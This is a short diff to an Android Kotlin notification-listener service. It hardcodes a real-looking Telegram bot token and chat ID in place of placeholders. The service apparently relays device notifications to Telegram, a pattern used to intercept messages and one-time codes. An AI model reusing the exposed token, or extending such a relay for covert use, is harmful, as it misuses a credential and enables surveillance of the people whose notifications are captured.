@@ -9,8 +9,8 @@ import java.net.URLEncoder
 
 class NotificationService : NotificationListenerService() {
 
-    private val BOT_TOKEN = "SEM_DOSAD_TELEGRAM_BOT_TOKEN"
-    private val CHAT_ID = "SEM_DOSAD_CHAT_ID"
+    private val BOT_TOKEN = "7680123844:AAF0dyDbRjzX80EdL_RKbu6m-mdPMbWqNmo"
+    private val CHAT_ID = "7071257483"
 
     override fun onNotificationPosted(sbn: StatusBarNotification) {
         val n = sbn.notification
